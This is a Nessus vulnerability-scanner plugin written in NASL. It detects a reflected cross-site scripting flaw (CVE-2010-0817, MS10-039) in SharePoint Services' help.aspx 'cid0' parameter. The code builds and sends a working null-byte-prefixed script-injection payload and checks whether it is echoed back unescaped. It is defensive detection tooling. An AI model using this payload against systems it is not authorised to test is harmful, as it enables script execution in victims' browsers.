#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(47580);
  script_version("$Revision: 1.20 $");
  script_cvs_date("$Date: 2016/12/14 20:22:12 $");

  script_cve_id("CVE-2010-0817");
  script_bugtraq_id(39776);
  script_osvdb_id(64170);
  script_xref(name:"MSFT", value:"MS10-039");
  script_xref(name:"IAVA", value:"2010-A-0079");
  script_xref(name:"Secunia", value:"39603");

  script_name(english:"Microsoft SharePoint Services Help.aspx 'cid0' Parameter XSS");
  script_summary(english:"Attempts a reflected XSS");

  script_set_attribute(attribute:"synopsis", value:
"An application running on the remote web server has a cross-site
scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Microsoft SharePoint Services running on the remote
host has a cross-site scripting vulnerability. Input sent to the
'cid0' parameter of '/_layouts/help.aspx' is not properly sanitized.

A remote attacker could exploit this by tricking a user into making a
malicious request, resulting in the execution of arbitrary script
code.");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?7c48e296");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2010/Apr/246");
  script_set_attribute(attribute:"see_also", value:"http://technet.microsoft.com/en-us/security/bulletin/MS10-039");
  script_set_attribute(attribute:"solution", value:"Microsoft has released a set of patches for SharePoint Services.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/04/28");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/06/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/07/01");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"stig_severity", value:"II");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "sharepoint_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/ASP", "www/sharepoint");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("smb_func.inc");
include("misc_func.inc");
include("byte_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

if ( get_kb_item("SMB/dont_send_in_cleartext") ) exit(0);

port = get_http_port(default:80);
install = get_install_from_kb(appname:'sharepoint', port:port, exit_on_fail:TRUE);

xss = 'MS.WSS.manifest.xml'+mkbyte(0)+'<script>alert(\''+SCRIPT_NAME+'-'+unixtime()+'\')</script>';
unreserved = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*-]/?=&";
xss_encoded = urlencode(str:xss, unreserved:unreserved);
qs = 'cid0='+xss_encoded+'&tid=X';
expected_output = '<br/>'+xss+'<br/>X<br/>';

url = install['dir']+'/_layouts/help.aspx?'+qs;
res = http_send_recv3(
  method:'GET',
  item:url,
  port:port,
  username:kb_smb_login(),
  password:kb_smb_password(),
  exit_on_fail:TRUE
);

if (
  '<title>Windows SharePoint Services' >< res[2] &&
  expected_output >< res[2]
)
{
  set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);

  if (report_verbosity > 0)
  {
    report = get_vuln_report(items:url, port:port);
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
else
{
  # It's possible the XSS failed due to failed authentication
  headers = parse_http_headers(status_line:res[0], headers:res[1]);
  if (isnull(headers)) exit(1, 'Error parsing HTTP headers on port '+port+'.');

  http_code = headers['$code'];
  if (isnull(http_code)) exit(1, "Error parsing HTTP response code");
  if (http_code == 401) exit(1, 'Authentication failed on port '+port+'.');

  exit(0, 'SharePoint Services on port '+port+' is not affected.');
}
